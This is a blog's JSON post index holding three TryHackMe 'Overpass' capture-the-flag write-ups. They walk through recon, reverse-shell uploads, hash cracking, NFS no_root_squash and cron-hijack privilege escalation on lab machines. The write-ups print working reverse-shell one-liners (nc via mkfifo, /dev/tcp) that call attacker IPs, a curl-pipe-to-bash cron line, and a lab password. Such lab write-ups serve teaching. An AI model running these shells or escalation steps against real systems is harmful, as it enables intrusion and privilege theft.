[ { "title": "Overpass 3", "url": "/posts/overpass-3/", "categories": "infosec, write-ups", "tags": "overpass, tryhackme", "date": "2022-08-20 00:00:00 +0000", "snippet": "Overpass 3 - Hosting After Overpass’s rocky start in infosec, and the commercial failure of their password manager and subsequent hack, they’ve decided to try a new business venture.GoalHack the machine and get three flags: Web Flag User Flag Root FlagInitial ReconNmap shows us an HTTP server on Apache running on port 80,There is also an FTP server on port 21, and SSH on port 22A Gobuster reveals a “/backups” directory.I also looked for a robots.txt but there was nothing to be found there.Backups folder has a private key (priv.key) in a zip file, as well as as a encrypted spreadsheet file (CustomerDetails.xlsx.gpg)Can I use this private key to decrypt the customer details?I imported the private key into my GPG keychain, and was able to use it todecrypt the CustomerDetails.xlsx.gpg file. Opening it in LibreOffice, I wasprovided with some credentials of three users, with passwords in plaintext. Aswell as some credit card numbers.I was unable to SSH in using any of these credentials, as they were secured usingkey based authentication, and the GPG isn’t any use for that.I was however able to log into the FTP server as the paradox user.Nothing interesting here, but I’m able to upload to the webserver, so I uploadeda PHP reverse shell from pentestmonkey.Setting up a web-listener…nc -lnvp 9999I got a shell!Took quite a bit of searching, but eventually I find the web flag with this command.find / -name *flag* 2&gt;/dev/nullNow that I had the web flag, I tried switching laterally to another user. Theonly user in this box that I had a credential for (from the spreadsheet) wasparadox. The shell I was using currently was pretty unstable, so I appendedmy public key to paradox’s authorized_keys file, and logged in via SSHdirectly. I couldn’t see anything obvious, and no user flag yet, so I uploadedlinpeas.sh using curl.This next part took me a good long while, but I’ve not experienced NFS servicesbefore. This is the key part of the linpeas output that indicates a PE vector.╔══════════╣ Analyzing NFS Exports Files (limit 70)-rw-r--r--. 1 root root 54 Nov 18 2020 /etc/exports/home/james *(rw,fsid=0,sync,no_root_squash,insecure)This section on hacktricks was useful reading:NFS no_root_squash/no_all_squash misconfiguration PERunningrpcinfo -p | grep nfsrevealed there was indeed a NFS server running on port 2049. However it wasonly accessable to localhost, I couldn’t see it from my attacker box. I can’tmake use of it on the remote box because I don’t have a root user.Again a lot of floundering here! I eventually discovered I was able tunnel theinternal 2049 port via SSH.ssh paradox@10.10.64.218 -L 2049:127.0.0.1:2049I was now able to see the remote share from my attacker box. From here I couldsee the james users flag, and was able to add my public key to james’authorized_keys file and log in via SSH.I mounted the share onto a local directory and tried copying the bash binaryacross from my attacker box, with a suid bit set (chmod +s bash), but wasgetting some errors thrown when trying to execute this as James, which I putdown to the builds being incompatible, I then just (as james) copied the localversion of bash into james home folder, then on my attacker box, chown’d it asroot and set the suid bit.This worked, and I was able to execute this version of bash using -p to (torun in priviledged mode, and not drop the file owners permissions). I now had aroot shell and was able to retrieve the final flag :)" }, { "title": "Overpass 2", "url": "/posts/overpass-2/", "categories": "infosec, write-ups", "tags": "overpass, tryhackme", "date": "2022-08-19 00:00:00 +0000", "snippet": "Overpass 2 continues the story from Overpass 1, but in this case a hacker hasexploited the weaknesses in the security of Overpass, and taken control of thewebsite.Task 1 - Forensics - Analyse the PCAPThis challenge has multiple tasks, the first is answering a series of questionsabout how this hacker gained access. I was provided with a .pcapng file toanalyse to answer them. What was the URL of the page they used to upload a reverse shell? What payload did the attacker use to gain access? What password did the attacker use to privesc? How did the attacker establish persistence? Using the fasttrack wordlist, how many of the system passwords were crackable?Uploading the payloadA pcapng file is a dump of sniffed packets captured over a network. I caninspect this data using a tool like Wireshark.Looking at the file we see a number of HTTP packets, notably a “POST” request to“/development/upload.php”. File uploads are a common way of gaining remote access,so I investigate the request further to see what was uploaded.Looking at this, we can see that the attacker posted a PHP reverse shell to theupload page.&lt;?php exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f\")?&gt;I’ve got the answer to the first two questions now.PrivEscLooking further at the HTTP packets we see that the attacker sent a “GET”request to this payload.php file in order to trigger the reverse shell.We’d expect to see plaintext TCP packets showing what was sent, and indeed wesee this.Taking a look at the shell session, the attacker cats out the contentsof the “.overpass” file (the fictional password manager in this task), and uses to get the password of the ‘james’ user. They then switch tothe “james” user with this password using the su command. Another question down.Gaining persistenceNext, to find out how the attacker gained persistence.Looking at this section of the session, we see that (after catting the contentsof the /etc/shadow file), they clone the contents of a backdoor,from a public Github repo. This repo is the answer to the final question of the first task.Task 2 - Research - Analyse the codeWe’ve now got access to the source code for the backdoor. For the second task we’re askeda number of questions. What’s the default hash for the backdoor? What’s the hardcoded salt for the backdoor? What was the hash that the attacker used? Crack the hash using rockyou and a cracking tool of your choice. What’s the password?Looking at the codeLooking at the repo, We can see that this backdoor spins up an SSH server. The default hashfor the server is defined in a variable on line 19.var hash string = \"bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3\"There are also a couple of password related functions of interest,...func verifyPass(hash, salt, password string) bool {\tresultHash := hashPassword(password, salt)\treturn resultHash == hash}...func passwordHandler(_ ssh.Context, password string) bool {\treturn verifyPass(hash, \"1c362db832f3f864c8c2fe05f2002a05\", password)}The verifyPass function takes a salt as its second argument, and the hardcoded value of1c362db832f3f864c8c2fe05f2002a05 is passed, the answer to our second question.The third question asked what hash the attacker used. Looking back at the PCAP, we see thatthe attack spins up the backdoor with the following command.james@overpass-production:~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bedFinally we’re asked to crack the hash using the rockyou.txt wordlist. I used hashcat for this.From the backdoor code, we know that the hash is of type sha512, and that it is salted.func hashPassword(password string, salt string) string {\thash := sha512.Sum512([]byte(password + salt))\treturn fmt.Sprintf(\"%x\", hash)}We can use method 1710 from the as described in the hashcat docs to breakthis hash.hashcat -m 1710 hash /usr/share/wordlists/rockyou.txtTask 3 - Attack - Get back in!Finally, we need to regain access to the server. We’ve got another attack box to investigate.We need the answers to: The attacker defaced the website. What message did they leave as a heading? What’s the user flag? What’s the root flag?VandalismI get the answer to the first question pretty easily, the home page now looks like thisRegaining accessWe know that the attacker used a backdoor SSH server on port 2222. Trying to login to this asthe “james” user, I kept getting an error message.$ ssh -p 2222 james@10.10.173.50Unable to negotiate with 10.10.173.50 port 2222: no matching host key type found. Their offer: ssh-rsaTurns out that that ssh-rsa has been depricated in versions of openssh &gt;= 8.7.I was able to workaround this with the following commandssh -p 2222 james@10.10.173.50 -oHostKeyAlgorithms=+ssh-rsaNow I had shell access for the james user, and could retrieve the user flag.The james user did not appear to have sudo access, so I poked around a bit to see what theattacker had left behind.We see the attacker left behind a .suid_bash file, owned by root, with a SUID bit set, presumablyfor easy escalation. If we run this binary with the -p flag, so that we retain the permissions of the owner of the file, we gain access to the root flag." }, { "title": "Overpass 1", "url": "/posts/overpass/", "categories": "infosec, write-ups", "tags": "overpass, tryhackme", "date": "2022-08-18 00:00:00 +0000", "snippet": "First in a series of three machines on TryHackMe. What happens when a group of broke Computer Science students try to make apassword manager?Obviously a perfect commercial success!GoalHack the machine and get the flags in user.txt and root.txtInitial reconPresented with a machine that appears to be running a web server, describing apiece of password management software.Running nmapnmap -sV -sV -oNReveals that this system is currently running an SSH and an HTTP server.22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)Looking at the website further, I see that the software is available fordownload as a number of pre-compiled binaries, as a well as a link to thesource code, aswell as a build script. Looks like the software is written inGo.Inspecting the source for the homepage, we also find this comment.&lt;p&gt;Overpass allows you to securely store different passwords for every service,protected using military grade &lt;!--Yeah right, just because the Romans used it doesn't make it military grade, change this?--&gt; cryptography to keep you safe.&lt;/p&gt; This comment suggests that we are probably looking at a Caesar cipher.Taking a peek at the code confirms this, as we see that it encrypts passwordsusing a rot47 function.We also see this interesting line in the automated build script.echo \"$(date -R) Builds completed\" &gt;&gt; /root/buildStatus The build script must be running as root. Maybe we can mess about with the datebinary?Further investigating the website, we enumerate the following locations withGobuster /img /downloads /aboutus /admin /cssChecking the “/admin” route out, we’re presented with an admin/password login.Weak client side authenticationTaking a look at login.js, we see this is very weakly secured with some clientside JS....if (statusOrCookie === \"Incorrect credentials\") { loginStatus.textContent = \"Incorrect Credentials\" passwordBox.value=\"\" } else { Cookies.set(\"SessionToken\",statusOrCookie) window.location = \"/admin\" }}...Setting the SessionToken value in our cookie to any value and refreshing thepage gets us access, and we’re presented with an RSA Private key and a possibleuser name of “James”. We already know that the server is running SSH, so thismight be our way in, but we also are told that this key is secured with apassword, which we’ll need to break.Cracking the private keyWe convert the private key we were given into a suitable format using“ssh2john.py”, followed by throwing rockyou.txt at it with johntheripper. Thispretty quickly gives us the password james13.Logging in via SSH with these credentials we get our first flag in user.txt.We also get a todo.txt which mentions that james has recorded his password using theoverpass password manager. Sure enough, looking for a .overpass file reveals someciphertext. We could just use the overpass software, but we know its just rot47, sowe can just slap it into an online tool. This gives us another credential, which isjames’ user password.{\"name\":\"System\",\"pass\":\"saydrawnlyingpicture\"}PrivEscRunning linpeas.sh to check for PE vectors reveals a few things etc/hosts is writable by all users. We see there is a cron job running every minute as root, running a buildscript.sh file.# Update builds from latest code* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bashWe see that the system is downloading the latest version of the build scriptand piping it directly into bash. As we can write to the etc/hosts file, we cansimply change the location of overpass.thm and point it to our own maliciouscode.Getting rootI used updog to spin up a local webserver on port 80,and placed a reverse shell script at the location of the build script.# buildscript.shsh -i &gt;&amp; /dev/tcp/10.18.10.136/9999 0&gt;&amp;1After waiting a minute for the cron job to run. I had a root shell and the final flag." } ]
